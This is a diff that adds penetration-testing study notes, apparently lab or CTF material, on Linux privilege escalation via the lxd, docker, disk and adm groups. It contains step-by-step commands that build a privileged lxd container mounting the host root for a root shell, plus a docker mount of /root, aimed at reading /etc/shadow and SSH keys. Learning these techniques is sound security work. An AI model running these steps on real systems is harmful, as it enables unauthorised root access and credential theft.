@@ -1063,3 +1063,95 @@ User sysadm may run the following commands on NIX02:
 
 ---
 
+# Privileged Groups Exploitation Notes
+
+## LXC / LXD
+- **Overview:**  
+  LXD is Ubuntu’s container manager, similar to Docker.  
+  Users added to the **lxd** group can escalate privileges.
+
+- **Steps to Exploit:**
+  1. Confirm group membership:
+     ```bash
+     id
+     ```
+     Example:
+     ```
+     uid=1009(devops) gid=1009(devops) groups=1009(devops),110(lxd)
+     ```
+  2. Extract Alpine image:
+     ```bash
+     unzip alpine.zip
+     cd 64-bit\ Alpine/
+     ```
+  3. Import image:
+     ```bash
+     lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
+     ```
+  4. Create privileged container:
+     ```bash
+     lxc init alpine r00t -c security.privileged=true
+     ```
+  5. Mount host filesystem:
+     ```bash
+     lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
+     ```
+  6. Start container and spawn shell:
+     ```bash
+     lxc start r00t
+     lxc exec r00t /bin/sh
+     ```
+     Inside container:
+     ```bash
+     id
+     uid=0(root) gid=0(root)
+     cd /mnt/root/root
+     ```
+     - Can read sensitive files (`/etc/shadow`, SSH keys, etc.).
+
+
+## Docker
+- **Overview:**  
+  Membership in **docker** group is equivalent to root privileges.
+
+- **Exploit Example:**
+  ```bash
+  docker run -v /root:/mnt -it ubuntu
+  ```
+
+* Mounts host `/root` into container at `/mnt`.
+* Can add SSH keys or retrieve hashes from `/etc/shadow`.
+
+## Disk
+
+* **Overview:**
+  Users in the **disk** group can access block devices in `/dev` (e.g., `/dev/sda1`).
+
+* **Exploit:**
+
+  * Use `debugfs` to browse the filesystem as root.
+  * Possible actions:
+
+    * Extract SSH keys
+    * Retrieve credentials
+    * Add new users
+
+## ADM
+
+* **Overview:**
+  Members of the **adm** group can read system logs in `/var/log`.
+
+* **Use Cases:**
+
+  * Not direct root access, but useful for:
+
+    * Collecting sensitive data from logs
+    * Enumerating cron jobs and user activity
+
+## Example
+
+```bash
+secaudit@NIX02:~$ id
+```
+
+---
